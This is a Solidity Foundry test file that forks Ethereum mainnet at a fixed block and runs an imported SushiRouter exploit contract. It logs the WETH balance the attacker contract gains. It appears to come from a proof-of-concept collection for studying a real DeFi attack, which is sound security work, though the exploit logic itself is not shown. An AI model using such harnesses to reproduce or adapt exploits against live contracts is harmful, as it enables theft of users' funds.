// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "../SushiRouterExploit.sol";


contract ContractTest is Test{
    SushiExpProxy f;
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    function setUp() public {
        vm.createSelectFork("https://rpc.flashbots.net", 17007841);
    }

    function test_sushiRouter() public {
        f = new SushiExpProxy();
        address exp_addr = computeCreateAddress(address(f), 1);
        console.log("WETH balance before attack: ", WETH.balanceOf(exp_addr));
        f.exploit();
        console.log("WETH balance after attack:", WETH.balanceOf(address(exp_addr)));
    }
}